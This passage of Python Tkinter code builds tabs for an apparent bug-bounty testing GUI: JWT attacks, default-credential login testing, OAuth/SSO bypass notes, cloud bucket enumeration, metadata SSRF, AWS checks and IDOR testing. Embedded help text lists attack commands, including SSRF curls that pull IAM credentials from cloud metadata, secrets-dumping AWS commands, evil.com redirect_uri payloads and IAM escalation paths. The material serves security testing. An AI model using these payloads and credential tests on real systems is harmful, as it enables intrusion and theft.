        self._mon_status = tk.Label(bf, text="", bg=BG2, fg=FG3, font=MONO_S)
        self._mon_status.pack(side='left', padx=12)

        # Output + changes list
        nb2 = ttk.Notebook(right); nb2.pack(fill='both', expand=True, padx=12, pady=(0,8))
        out_f = tk.Frame(nb2, bg=BG2); nb2.add(out_f, text="  📋 Output  ")
        chg_f = tk.Frame(nb2, bg=BG2); nb2.add(chg_f, text="  ⚠️ Changes  ")
        self._mon_term = Terminal(out_f, height=14, title="MONITOR")
        self._mon_term.pack(fill='both', expand=True)
        # Changes treeview
        cols = ('Target','Type','Severity','Detail','Found At')
        self._mon_chg_tree = mk_tree(chg_f, columns=cols, show='headings', height=14)
        for c,w in [('Target',120),('Type',130),('Severity',80),('Detail',300),('Found At',100)]:
            self._mon_chg_tree.heading(c,text=c); self._mon_chg_tree.column(c, width=w)
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
            self._mon_chg_tree.tag_configure(sev, foreground=SEV_COLOR(sev))
        vsb2 = ttk.Scrollbar(chg_f, orient='vertical', command=self._mon_chg_tree.yview)
        self._mon_chg_tree.configure(yscrollcommand=vsb2.set)
        tf2 = mk_frame(chg_f, bg=BG2); tf2.pack(fill='both', expand=True)
        self._mon_chg_tree.pack(side='left', fill='both', expand=True, in_=tf2)
        vsb2.pack(side='right', fill='y', in_=tf2)
        self._mon_load()

    def _mon_load(self):
        self._mon_tree.delete(*self._mon_tree.get_children())
        for m in load_monitors():
            changes_count = len(m.get('changes',[]))
            tag = 'changed' if changes_count > 0 else 'active' if m.get('baseline') else 'idle'
            last = (m.get('last_scan','')[:10] if m.get('last_scan') else 'Never')
            self._mon_tree.insert('','end', values=(
                m['target'], '✓' if m.get('enabled') else '✗',
                changes_count, last), tags=(tag,))

    def _mon_add(self):
        target = self._mon_new.get().strip()
        if not target: return
        try: interval = int(self._mon_interval.get())
        except: interval = 24
        add_monitor(target, interval_hours=interval)
        self._mon_load()
        self.set_status(f"Monitor added: {target}", GREEN)
        self._mon_new.set("")

    def _mon_remove(self):
        sel = self._mon_tree.selection()
        if not sel: return
        target = str(self._mon_tree.item(sel[0])['values'][0])
        if messagebox.askyesno("Remove", f"Remove monitor for '{target}'?", parent=self.root):
            from modules.advanced.tools import remove_monitor
            remove_monitor(target); self._mon_load()

    def _mon_check_now(self):
        sel = self._mon_tree.selection()
        if not sel:
            messagebox.showinfo("Select Target", "Click a target in the list first.", parent=self.root); return
        target = str(self._mon_tree.item(sel[0])['values'][0])
        self._mon_status.config(text=f"⏳ Checking {target}...", fg=CYAN)
        self._mon_term.log(f"[*] Starting monitor check: {target}", 'info')
        def _go():
            changes = run_monitor_check(target, log_cb=self._mon_term.log)
            def _upd():
                self._mon_load()
                self._mon_update_changes()
                if changes:
                    self._mon_status.config(text=f"⚠ {len(changes)} changes found!", fg=RED)
                    self.set_status(f"Monitor: {len(changes)} changes for {target}", RED)
                else:
                    # Check if we just took baseline
                    monitors = load_monitors()
                    m = next((x for x in monitors if x['target'] == target), {})
                    if not m.get('last_scan'):
                        self._mon_status.config(text="✅ Baseline saved — run again to detect changes", fg=GREEN)
                    else:
                        self._mon_status.config(text="✅ No changes detected", fg=GREEN)
                    self.set_status(f"Monitor check complete: {target}", GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _mon_check_all(self):
        monitors = load_monitors()
        if not monitors:
            messagebox.showinfo("No Monitors", "Add targets first.", parent=self.root); return
        self._mon_status.config(text=f"Checking {len(monitors)} targets...", fg=CYAN)
        def _go():
            total_changes = 0
            for m in monitors:
                if not m.get('enabled', True): continue
                changes = run_monitor_check(m['target'], log_cb=self._mon_term.log)
                total_changes += len(changes)
            def _upd():
                self._mon_load(); self._mon_update_changes()
                self._mon_status.config(
                    text=f"All checked: {total_changes} total changes",
                    fg=RED if total_changes else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _mon_update_changes(self):
        self._mon_chg_tree.delete(*self._mon_chg_tree.get_children())
        for m in load_monitors():
            for c in m.get('changes',[]):
                sev = c.get('severity','INFO')
                self._mon_chg_tree.insert('','end', values=(
                    m['target'], c.get('type',''), sev,
                    c.get('detail','')[:60], c.get('found_at','')[:16]), tags=(sev,))

    def _mon_view_changes(self):
        self._mon_update_changes()

    # ═══════════════════════════════════════════════════════════════
    #  TIER 2 — AUTHENTICATION TESTING SUITE
    # ═══════════════════════════════════════════════════════════════
    def _build_auth_testing(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        j = tk.Frame(nb2, bg=BG2); nb2.add(j, text="  🔑 JWT Attacks  ")
        d = tk.Frame(nb2, bg=BG2); nb2.add(d, text="  🔐 Default Creds  ")
        s = tk.Frame(nb2, bg=BG2); nb2.add(s, text="  🍪 Session Analysis  ")
        o = tk.Frame(nb2, bg=BG2); nb2.add(o, text="  🔒 OAuth/SSO  ")
        self._build_jwt_tab(j)
        self._build_creds_tab(d)
        self._build_session_tab(s)
        self._build_oauth_tab(o)

    def _build_jwt_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "JWT ATTACK SUITE", "🔑").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="JWT Token:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._jwt_token = tk.StringVar()
        mk_entry(tr, var=self._jwt_token, w=52).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Analyze", self._jwt_analyze, ACCENT, small=True).pack(side='left', padx=4)
        # Attack buttons
        atk_f = mk_frame(pad, bg=BG2); atk_f.pack(fill='x', pady=(0,8))
        for name, cmd, clr in [
            ("⚡ None Algorithm",  self._jwt_none_attack,    RED),
            ("🔑 Brute Secret",    self._jwt_brute_secret,   YELLOW),
            ("🔄 RS256→HS256",     self._jwt_rs256_hs256,    CYAN),
            ("💉 KID Injection",   self._jwt_kid_inject,     PURPLE),
        ]:
            mk_btn(atk_f, name, cmd, clr, small=True).pack(side='left', padx=4)
        # Output
        self._jwt_out = mk_stext(pad, h=20, bg=BG3, fg=GREEN)
        self._jwt_out.pack(fill='both', expand=True, pady=(8,0))
        # Pre-populate with attack info
        self._jwt_out.insert('end', "JWT ATTACK REFERENCE\n" + "="*50 + "\n\n")
        for name, data in JWT_ATTACKS.items():
            self._jwt_out.insert('end', f"[{name}]\n")
            self._jwt_out.insert('end', f"  {data.get('description','')}\n")
            self._jwt_out.insert('end', f"  Impact: {data.get('impact','')}\n\n")
        self._jwt_out.config(state='disabled')
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy Output", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(self._jwt_out.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)
        mk_btn(bf, "💾 Save", lambda: self._save_text(self._jwt_out.get('1.0','end')), GREEN, small=True).pack(side='left', padx=4)

    def _jwt_none_attack(self):
        self._jwt_out.config(state='normal')
        self._jwt_out.delete('1.0','end')
        self._jwt_out.insert('end', "ALGORITHM NONE ATTACK PAYLOADS\n" + "="*50 + "\n\n")
        for name, data in JWT_ATTACKS.items():
            if "None" in name:
                for token in data.get('tokens',[]):
                    self._jwt_out.insert('end', f"{token}\n\n")
        self._jwt_out.insert('end', "\nUSAGE:\n")
        self._jwt_out.insert('end', 'curl -H "Authorization: Bearer <token_above>" https://target.com/api/admin\n')
        self._jwt_out.config(state='disabled')

    def _jwt_brute_secret(self):
        token = self._jwt_token.get().strip()
        self._jwt_out.config(state='normal'); self._jwt_out.delete('1.0','end')
        secrets = JWT_ATTACKS.get("Weak Secret Brute Force",{}).get("secrets",[])
        self._jwt_out.insert('end', f"Common JWT secrets to test ({len(secrets)}):\n\n")
        for s in secrets:
            self._jwt_out.insert('end', f'  hashcat -a 0 -m 16500 "{token if token else "JWT_TOKEN_HERE"}" wordlist.txt\n')
            break
        self._jwt_out.insert('end', "\nWeak secrets list:\n")
        for s in secrets: self._jwt_out.insert('end', f"  {s}\n")
        self._jwt_out.insert('end', "\nTool: python3 -c \"import jwt; [print(s) for s in secrets if jwt.decode(token, s)]\"\n")
        self._jwt_out.config(state='disabled')

    def _jwt_rs256_hs256(self):
        self._jwt_out.config(state='normal'); self._jwt_out.delete('1.0','end')
        for step in JWT_ATTACKS.get("RS256 → HS256 Confusion",{}).get("steps",[]):
            self._jwt_out.insert('end', f"{step}\n")
        self._jwt_out.insert('end', "\nTool: python3 jwt_tool.py <token> -X k -pk public.pem\n")
        self._jwt_out.config(state='disabled')

    def _jwt_kid_inject(self):
        self._jwt_out.config(state='normal'); self._jwt_out.delete('1.0','end')
        self._jwt_out.insert('end', "KID INJECTION PAYLOADS\n\n")
        for p in JWT_ATTACKS.get("KID Path Traversal",{}).get("payloads",[]):
            self._jwt_out.insert('end', f'  kid: "{p}"\n')
        self._jwt_out.config(state='disabled')

    def _build_creds_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "DEFAULT CREDENTIALS TESTER", "🔐").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Login URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._creds_url = tk.StringVar(value=f"https://{self.project.get()}/admin/login" if self.project.get() else "")
        mk_entry(tr, var=self._creds_url, w=48).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Test Creds", self._test_default_creds, RED, small=True).pack(side='left', padx=4)
        self._creds_count = tk.Label(pad, text=f"Testing {len(DEFAULT_CREDENTIALS)} credential pairs", bg=BG2, fg=FG3, font=MONO_S)
        self._creds_count.pack(anchor='w', pady=(0,4))
        cols = ('Username','Password','Status','Signal')
        self._creds_tree = mk_tree(pad, columns=cols, show='headings', height=14)
        for c,w in [('Username',120),('Password',120),('Status',70),('Signal',200)]:
            self._creds_tree.heading(c,text=c); self._creds_tree.column(c, width=w)
        self._creds_tree.tag_configure('found', foreground=RED, background='#1a0005')
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._creds_tree.yview)
        self._creds_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._creds_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)
        self._creds_status = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S); self._creds_status.pack(anchor='w', pady=(4,0))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(4,0))
        mk_btn(bf, "📋 Copy Found", lambda: (self.root.clipboard_clear(), self.root.clipboard_append(
            '\n'.join(f"{self._creds_tree.item(i)['values'][0]}:{self._creds_tree.item(i)['values'][1]}"
            for i in self._creds_tree.get_children() if 'found' in self._creds_tree.item(i)['tags'])
        )), RED, small=True).pack(side='left', padx=4)

    def _test_default_creds(self):
        url = self._creds_url.get().strip()
        if not url: return
        self._creds_tree.delete(*self._creds_tree.get_children())
        self._creds_status.config(text="Testing credentials...", fg=CYAN)
        def _go():
            found = test_default_creds(url, DEFAULT_CREDENTIALS[:30])
            def _upd():
                for cred in found:
                    self._creds_tree.insert('','end', values=(
                        cred['username'], cred['password'],
                        cred['status'], cred.get('signal','')), tags=('found',))
                n = len(found)
                self._creds_status.config(
                    text=f"Found: {n} valid credential pair(s)" if n else "No valid credentials found",
                    fg=RED if n else GREEN)
                self.set_status(f"Default creds: {n} found", RED if n else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_session_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "SESSION MANAGEMENT ANALYZER", "🍪").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._sess_url = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "")
        mk_entry(tr, var=self._sess_url, w=48).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "🔍 Analyze Session", self._analyze_session, ACCENT, small=True).pack(side='left', padx=4)
        self._sess_txt = mk_stext(pad, h=26, bg=BG3, fg=FG); self._sess_txt.pack(fill='both', expand=True, pady=(8,0))
        self._sess_txt.insert('end', "SESSION SECURITY CHECKS:\n\n"
            "• HttpOnly flag — prevents JS cookie access\n"
            "• Secure flag — HTTPS-only cookie\n"
            "• SameSite — CSRF protection\n"
            "• Session token entropy — must be > 128 bits\n"
            "• Expiry — tokens must expire\n"
            "• Token fixation — must regenerate on login\n\n"
            "Enter URL above and click Analyze.")
        self._sess_txt.config(state='disabled')

    def _analyze_session(self):
        url = self._sess_url.get().strip()
        if not url: return
        self._sess_txt.config(state='normal'); self._sess_txt.delete('1.0','end')
        self._sess_txt.insert('end', f"[*] Analyzing session for: {url}\n\n")
        self._sess_txt.config(state='disabled')
        def _go():
            r = analyze_session(url)
            def _upd():
                self._sess_txt.config(state='normal')
                issues = r.get('issues',[])
                tokens = r.get('session_tokens',[])
                self._sess_txt.insert('end', f"Cookies found: {len(tokens)}\n\n")
                for tok in tokens:
                    self._sess_txt.insert('end', f"  Set-Cookie: {tok[:100]}\n")
                self._sess_txt.insert('end', f"\nIssues found: {len(issues)}\n\n")
                for iss in issues:
                    self._sess_txt.insert('end', f"  [{iss['severity']}] {iss['issue']}\n")
                if not issues:
                    self._sess_txt.insert('end', "  No obvious session issues found\n")
                if r.get('error'):
                    self._sess_txt.insert('end', f"\nError: {r['error']}\n")
                self._sess_txt.config(state='disabled')
                self.set_status(f"Session: {len(issues)} issues found", RED if issues else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_oauth_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "OAUTH / SSO BYPASS GUIDE", "🔒").pack(fill='x', pady=(0,8))
        txt = mk_stext(pad, h=30, bg=BG3, fg=FG); txt.pack(fill='both', expand=True)
        txt.insert('end', """OAUTH 2.0 VULNERABILITIES
════════════════════════════════════════════════════

1. OPEN REDIRECT IN REDIRECT_URI
   Test: redirect_uri=https://evil.com
   Test: redirect_uri=https://target.com.evil.com
   Test: redirect_uri=https://target.com@evil.com
   Impact: Authorization code/token theft

2. STATE PARAMETER MISSING/WEAK
   Test: Remove state parameter entirely
   Test: Use same state twice
   Impact: CSRF on OAuth flow

3. IMPLICIT FLOW TOKEN LEAKAGE
   Check: #access_token in URL fragments
   Check: Referer header leaking token
   Impact: Token theft via referrer

4. AUTHORIZATION CODE REUSE
   Test: Replay the same auth code twice
   Impact: Should fail on second use

5. SCOPE MANIPULATION
   Test: Add admin/read:all scope to request
   Impact: Privilege escalation

6. PKCE BYPASS
   Test: Remove code_challenge parameter
   Test: code_challenge_method=plain
   Impact: Authorization code interception

SSO BYPASS TECHNIQUES
════════════════════════════════════════════════════

• XML Signature Wrapping (SAML)
• SAML response replay
• XML external entity in SAML
• Manipulate NameID/Attribute
• Golden SAML (Microsoft)
• Pass-the-ticket / Pass-the-hash
• OpenID Connect parameter injection

TESTING TOOLS:
  - oauth2-proxy
  - jwt_tool
  - saml-raider (Burp extension)""")
        txt.config(state='disabled')

    # ═══════════════════════════════════════════════════════════════
    #  TIER 2 — CLOUD SECURITY SCANNER
    # ═══════════════════════════════════════════════════════════════
    def _build_cloud_sec(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        s3  = tk.Frame(nb2, bg=BG2); nb2.add(s3,  text="  ☁️ Bucket Enum  ")
        ms  = tk.Frame(nb2, bg=BG2); nb2.add(ms,  text="  💥 Metadata SSRF  ")
        aws = tk.Frame(nb2, bg=BG2); nb2.add(aws, text="  🔑 AWS Checks  ")
        ref = tk.Frame(nb2, bg=BG2); nb2.add(ref, text="  📖 Cloud Ref  ")
        self._build_bucket_tab(s3)
        self._build_metadata_tab(ms)
        self._build_aws_checks_tab(aws)
        self._build_cloud_ref_tab(ref)

    def _build_bucket_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "CLOUD BUCKET ENUMERATION", "☁️").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Domain:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._bucket_target = tk.StringVar(value=self.project.get() or "")
        mk_entry(tr, var=self._bucket_target, w=36).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self._bucket_target.set(self.project.get()), FG3, small=True).pack(side='left')
        mk_btn(tr, "🔍 Enumerate Buckets", self._run_bucket_enum, RED, small=True).pack(side='right', padx=4, ipady=4)
        self._bucket_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S); self._bucket_stat.pack(anchor='w', pady=(0,4))
        cols = ('Type','Bucket/URL','Status','Severity')
        self._bucket_tree = mk_tree(pad, columns=cols, show='headings', height=16)
        for c,w in [('Type',100),('Bucket/URL',300),('Status',120),('Severity',80)]:
            self._bucket_tree.heading(c,text=c); self._bucket_tree.column(c, width=w)
        for sev in ('CRITICAL','HIGH','MEDIUM','LOW','INFO'):
            self._bucket_tree.tag_configure(sev, foreground=SEV_COLOR(sev), background=SEV_BG(sev))
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._bucket_tree.yview)
        self._bucket_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._bucket_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)
        self._bucket_tree.bind('<Double-1>', lambda e: webbrowser.open(
            str(self._bucket_tree.item(self._bucket_tree.selection()[0])['values'][1])
            if self._bucket_tree.selection() else ""))

    def _run_bucket_enum(self):
        domain = self._bucket_target.get().strip()
        if not domain: return
        domain = domain.replace('https://','').replace('http://','').split('/')[0]
        self._bucket_stat.config(text="Enumerating cloud buckets...", fg=CYAN)
        self._bucket_tree.delete(*self._bucket_tree.get_children())
        def _go():
            results = enumerate_buckets(domain, log_cb=lambda t,tag='n': None)
            def _upd():
                for r in results:
                    sev = r.get('severity','INFO')
                    self._bucket_tree.insert('','end', values=(
                        r.get('type',''), r.get('url',''),
                        r.get('type','').replace('_',' '), sev), tags=(sev,))
                n = len([r for r in results if r.get('severity') in ('CRITICAL','HIGH')])
                self._bucket_stat.config(
                    text=f"Found {len(results)} buckets  |  {n} public/critical",
                    fg=RED if n else GREEN)
                self.set_status(f"Buckets: {len(results)} found ({n} critical)", RED if n else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_metadata_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "CLOUD METADATA SSRF TESTING", "💥").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Target URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._meta_url = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "")
        mk_entry(tr, var=self._meta_url, w=44).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "💥 Test Metadata SSRF", self._test_metadata_ssrf, RED, small=True).pack(side='left', padx=4)
        self._meta_txt = mk_stext(pad, h=24, bg=BG3, fg=FG); self._meta_txt.pack(fill='both', expand=True, pady=(8,0))
        self._meta_txt.insert('end', "CLOUD METADATA ENDPOINTS:\n\n"
            "AWS:   http://169.254.169.254/latest/meta-data/\n"
            "AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "GCP:   http://metadata.google.internal/computeMetadata/v1/\n"
            "Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
            "Alibaba: http://100.100.100.200/latest/meta-data/\n\n"
            "TEST: curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'\n")
        self._meta_txt.config(state='disabled')

    def _test_metadata_ssrf(self):
        url = self._meta_url.get().strip()
        if not url: return
        self._meta_txt.config(state='normal'); self._meta_txt.delete('1.0','end')
        self._meta_txt.insert('end', f"[*] Testing metadata SSRF on: {url}\n\n"); self._meta_txt.config(state='disabled')
        def _go():
            results = check_cloud_metadata(url)
            def _upd():
                self._meta_txt.config(state='normal')
                if results:
                    self._meta_txt.insert('end', f"[!!!] {len(results)} SSRF vulnerabilities found!\n\n")
                    for r in results:
                        self._meta_txt.insert('end', f"[{r['severity']}] {r['detail']}\n  URL: {r['url']}\n\n")
                else:
                    self._meta_txt.insert('end', "[OK] No obvious metadata SSRF found\n\n"
                        "Tips:\n"
                        "• Also test POST body parameters\n"
                        "• Try Host header injection\n"
                        "• Check for SSRF via file upload (XML, SVG)\n")
                self._meta_txt.config(state='disabled')
                self.set_status(f"Metadata SSRF: {len(results)} found", RED if results else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_aws_checks_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "AWS SECURITY CHECKS", "🔑").pack(fill='x', pady=(0,8))
        txt = mk_stext(pad, h=30, bg=BG3, fg=FG); txt.pack(fill='both', expand=True)
        txt.insert('end', """AWS SECURITY CHECKLIST FOR BUG HUNTERS
════════════════════════════════════════

S3 BUCKET MISCONFIGURATIONS
  aws s3 ls s3://BUCKET --no-sign-request
  aws s3 ls s3://BUCKET                       # with creds
  aws s3 cp s3://BUCKET/file.txt .            # download
  curl https://BUCKET.s3.amazonaws.com/       # list ACL

IAM CREDENTIAL TESTING
  aws sts get-caller-identity                  # verify creds valid
  aws iam list-users                           # enumerate users
  aws iam list-roles                           # enumerate roles
  aws iam get-account-summary                  # account overview
  aws s3api list-buckets                       # list all buckets

METADATA CREDENTIAL EXFIL (via SSRF)
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

LAMBDA FUNCTION ABUSE
  aws lambda list-functions
  aws lambda get-function-url-config --function-name FUNC
  aws lambda invoke --function-name FUNC /tmp/out.txt

SECRETS MANAGER / SSM
  aws secretsmanager list-secrets
  aws secretsmanager get-secret-value --secret-id NAME
  aws ssm get-parameters --names /prod/db/password --with-decryption

CLOUDWATCH / CLOUDTRAIL
  aws cloudtrail describe-trails
  aws logs describe-log-groups

ESCALATION PATHS
  AdministratorAccess policy → Full access
  iam:CreatePolicyVersion → Policy escalation
  iam:AttachUserPolicy → Attach admin policy
  iam:PassRole + ec2:RunInstances → Instance with admin role

Configure: aws configure (add exposed key/secret)
Tool: pacu (AWS exploitation framework)""")
        txt.config(state='disabled')

    def _build_cloud_ref_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "CLOUD SECURITY REFERENCE", "📖").pack(fill='x', pady=(0,8))
        txt = mk_stext(pad, h=30, bg=BG3, fg=FG); txt.pack(fill='both', expand=True)
        txt.insert('end', """AZURE SECURITY CHECKS
════════════════════════
  Blob Storage: https://ACCOUNT.blob.core.windows.net/$web/
  Azure IMDS:   curl -H "Metadata:true" http://169.254.169.254/metadata/instance
  App Service:  *.azurewebsites.net — check for takeover
  Power Apps:   *.powerappsportals.com — public data exposure

GCP SECURITY CHECKS
════════════════════════
  GCS Bucket:   https://storage.googleapis.com/BUCKET/
  Metadata:     curl -H "Metadata-Flavor:Google" http://metadata.google.internal/
  Service Acct: GET /computeMetadata/v1/instance/service-accounts/default/token
  Firebase:     https://PROJECTID.firebaseio.com/.json (public DB)

KUBERNETES SECURITY
════════════════════════
  Exposed Dashboard:  http://target:8001/api/v1/namespaces/
  SSRF to K8s API:    http://kubernetes.default.svc/api/v1/secrets
  ETCD:               http://target:2379/v2/keys/
  Kubelet:            https://target:10250/run/default/pod/container
  Service Account:    /var/run/secrets/kubernetes.io/serviceaccount/token

DOCKER SECURITY
════════════════════════
  Exposed API:  curl http://target:2375/containers/json
  Escape:       mount host filesystem into container
  Privileged:   --privileged flag → host escape

SERVERLESS
════════════════════════
  Lambda URL:   https://LAMBDAID.lambda-url.REGION.on.aws/
  Function App: https://APPNAME.azurewebsites.net/api/FUNCTION
  Cloud Run:    https://SERVICE-HASH-REGION.run.app""")
        txt.config(state='disabled')

    # ═══════════════════════════════════════════════════════════════
    #  TIER 2/3 — API SECURITY TESTER
    # ═══════════════════════════════════════════════════════════════
    def _build_api_tester(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        id_f = tk.Frame(nb2, bg=BG2); nb2.add(id_f, text="  🎯 IDOR/BOLA  ")
        ma_f = tk.Frame(nb2, bg=BG2); nb2.add(ma_f, text="  📝 Mass Assignment  ")
        vr_f = tk.Frame(nb2, bg=BG2); nb2.add(vr_f, text="  🔢 Version Fuzz  ")
        gq_f = tk.Frame(nb2, bg=BG2); nb2.add(gq_f, text="  ⚛ GraphQL  ")
        self._build_idor_tab(id_f)
        self._build_mass_assign_tab(ma_f)
        self._build_ver_fuzz_tab(vr_f)
        self._build_graphql_tab(gq_f)

    def _build_idor_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "IDOR / BOLA TESTER", "🎯").pack(fill='x', pady=(0,8))
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="Base URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._idor_base = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "")
        mk_entry(r1, var=self._idor_base, w=44).pack(side='left', padx=8, ipady=3)
        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._idor_ep = tk.StringVar(value="/api/v1/users")
        mk_entry(r2, var=self._idor_ep, w=28).pack(side='left', padx=8, ipady=3)
        tk.Label(r2, text="Auth Header:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._idor_auth = tk.StringVar(value="Bearer YOUR_TOKEN")
        mk_entry(r2, var=self._idor_auth, w=28).pack(side='left', ipady=3)
        mk_btn(r2, "🎯 Test IDOR", self._run_idor_test, RED, small=True).pack(side='right', padx=4, ipady=4)
        self._idor_stat = tk.Label(pad, text="", bg=BG2, fg=FG3, font=MONO_S); self._idor_stat.pack(anchor='w', pady=(0,4))
        cols = ('ID','URL','Status','Size','Sample')
        self._idor_tree = mk_tree(pad, columns=cols, show='headings', height=18)
        for c,w in [('ID',60),('URL',280),('Status',60),('Size',70),('Sample',260)]:
            self._idor_tree.heading(c,text=c); self._idor_tree.column(c, width=w)
        self._idor_tree.tag_configure('different', foreground=YELLOW, background=BG3)
        vsb = ttk.Scrollbar(pad, orient='vertical', command=self._idor_tree.yview)
        self._idor_tree.configure(yscrollcommand=vsb.set)
        tf = mk_frame(pad, bg=BG2); tf.pack(fill='both', expand=True)
        self._idor_tree.pack(side='left', fill='both', expand=True, in_=tf); vsb.pack(side='right', fill='y', in_=tf)

    def _run_idor_test(self):
        base = self._idor_base.get().strip(); ep = self._idor_ep.get().strip()
        auth = self._idor_auth.get().strip()
        if not base: return
        headers = {"Authorization": auth} if auth else {}
        headers["User-Agent"] = "Mozilla/5.0"
        self._idor_stat.config(text="Testing IDOR...", fg=CYAN)
        self._idor_tree.delete(*self._idor_tree.get_children())
        def _go():
            results = test_idor(base, ep, headers=headers)
            def _upd():
                for r in results:
                    tag = 'different' if r.get('size',0) > 100 else 'row'
                    self._idor_tree.insert('','end', values=(
                        r.get('id',''), r.get('url',''), r.get('status',''),
                        r.get('size',0), r.get('sample','')[:50]), tags=(tag,))
                self._idor_stat.config(text=f"Found {len(results)} accessible IDs", fg=GREEN if results else RED)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_mass_assign_tab(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=14, pady=10)
        mk_section(pad, "MASS ASSIGNMENT TESTER", "📝").pack(fill='x', pady=(0,8))
        r1 = mk_frame(pad, bg=BG2); r1.pack(fill='x', pady=(0,6))
        tk.Label(r1, text="URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ma_url = tk.StringVar(value=f"https://{self.project.get()}/api/v1/user" if self.project.get() else "")
        mk_entry(r1, var=self._ma_url, w=44).pack(side='left', padx=8, ipady=3)
        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Method:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._ma_method = tk.StringVar(value="PUT")
        ttk.Combobox(r2, textvariable=self._ma_method, values=["POST","PUT","PATCH","DELETE"], width=8, font=MONO_S).pack(side='left', padx=8)
        mk_btn(r2, "📝 Test Mass Assignment", self._run_mass_assign, RED, small=True).pack(side='right', padx=4, ipady=4)
        self._ma_txt = mk_stext(pad, h=22, bg=BG3, fg=FG); self._ma_txt.pack(fill='both', expand=True, pady=(8,0))
